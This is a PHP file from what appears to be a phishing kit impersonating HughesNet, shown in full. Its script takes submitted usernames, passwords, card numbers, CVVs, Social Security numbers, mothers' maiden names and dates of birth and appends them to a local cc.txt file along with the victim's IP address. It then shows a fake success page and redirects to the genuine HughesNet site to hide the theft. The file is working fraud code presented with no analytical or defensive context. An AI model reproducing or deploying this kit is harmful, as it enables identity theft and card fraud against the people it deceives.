<?php
if(isset($_POST['step2'])){
	
$firstname = $_POST['fname'];
$lastname = $_POST['lname'];
$address = $_POST['address'];
$address2 = $_POST['address2'];
$city = $_POST['city'];
$state = $_POST['state'];
$zipcode = $_POST['zipcode'];
$username = $_POST['username'];
$password = $_POST['password'];
$nameoncard = $_POST['nameoncard'];
$cc_type = $_POST['cc_type'];
$card_num = $_POST['card_num'];
$cvv = $_POST['cvv'];
$exp_month = $_POST['exp_month'];
$exp_year = $_POST['exp_year'];
$issue_bank = $_POST['issue_bank'];
$phone = $_POST['phone'];
$ssn = $_POST['ssn'];
$mmn = $_POST['mmn'];
$dob = $_POST['dob1'] ."/". $_POST['dob2'] . "/". $_POST['dob3'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('l jS \of F Y h:i:s A');
$site = "http://www.hughesnet.com/";
$counter =  $_POST['counter'];
$browser =  $_POST['browser'];



$fp = fopen("cc.txt","a+") or exit("unable to open the file");
if($fp != null)
{
$spa = "\r\n";

$line = "-----------------------------------------------------";
fwrite($fp, "Username: " . $username);
fwrite($fp, $spa); 

fwrite($fp, "Password: " . $password);
fwrite($fp, $spa); 

fwrite($fp, "FirstName: " . $firstname);
fwrite($fp, $spa);

fwrite($fp, "LastName: " . $lastname);
fwrite($fp, $spa);

fwrite($fp, "Address: " . $address);
fwrite($fp, $spa);

fwrite($fp, "Work Address: " . $address2);
fwrite($fp, $spa);

fwrite($fp, "City: " . $city);
fwrite($fp, $spa);

fwrite($fp, "state: " . $state);
fwrite($fp, $spa);

fwrite($fp, "Zipcode: " . $zipcode);
fwrite($fp, $spa);

fwrite($fp, "SSN: " . $ssn);
fwrite($fp, $spa);

fwrite($fp, "MMN: " . $mmn);
fwrite($fp, $spa);

fwrite($fp, "DOB: " . $dob);
fwrite($fp, $spa);

fwrite($fp, "Name on Card: " . $nameoncard);
fwrite($fp, $spa);

fwrite($fp, "Card Type: " . $cc_type);
fwrite($fp, $spa);

fwrite($fp, "Card Number: " . $card_num);
fwrite($fp, $spa);

fwrite($fp, "Cvv: " . $cvv);
fwrite($fp, $spa);

fwrite($fp, "Expiry Month: " . $exp_month);
fwrite($fp, $spa);

fwrite($fp, "Expiry Year: " . $exp_year);
fwrite($fp, $spa);


fwrite($fp, "Isuing Bank: " . $issue_bank);
fwrite($fp, $spa);

fwrite($fp, "Phone: " . $phone);
fwrite($fp, $spa);

fwrite($fp, "Ip: " . $ip);
fwrite($fp, $spa);

fwrite($fp, "Time: " . $time);
fwrite($fp, $spa);

fwrite($fp, "Browser: " . $browser);
fwrite($fp, $spa);

fwrite($fp, "Counter: " . $counter);
fwrite($fp, $spa);

fwrite($fp, "Site: " . $site);
fwrite($fp, $spa);

fwrite($fp, $line);
fwrite($fp, $spa);
fwrite($fp, $spa);
}
fclose($fp);
}

?>
 
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" type="text/css" href="./HNSLogin_files/sso_login.css">
  <link rel="stylesheet" type="text/css" href="./HNSLogin_files/common.css">
  <link href="./HNSLogin_files/css" rel="stylesheet" type="text/css">

</head>
<body onclick="closeErrorDiv()" id="PageBody">
    <img  class="SS_Header_Container" src="HNSLogin_files/2.png"><br><br><br><br><br><br><br><br>
	
	

<div align="center" style="width:100%;">
        
		 <img   src="HNSLogin_files/4.png" style=" width: 140px; high:140px ;"> <br>
		 <h3> The confirmation was successful !</h3>
		 <p>If browser does not redirect in few minutes <a href="successful.htm">click here</a> to continue.</p>
			
   <h2 style="color:#;">Please wait...</h2>
  
	
  
 </div>
 

  <img  class="SS_Width_Pct_Full SS_Footer_Container" src="HNSLogin_files/3.png">

<script>
            setTimeout(function(){
                window.location.href="http://myhughesnet.hughesnet.com/"; // The URL that will be redirected too.
            }, 2000); // The bigger the number the longer the delay.
        </script>

  	

  





</body></html>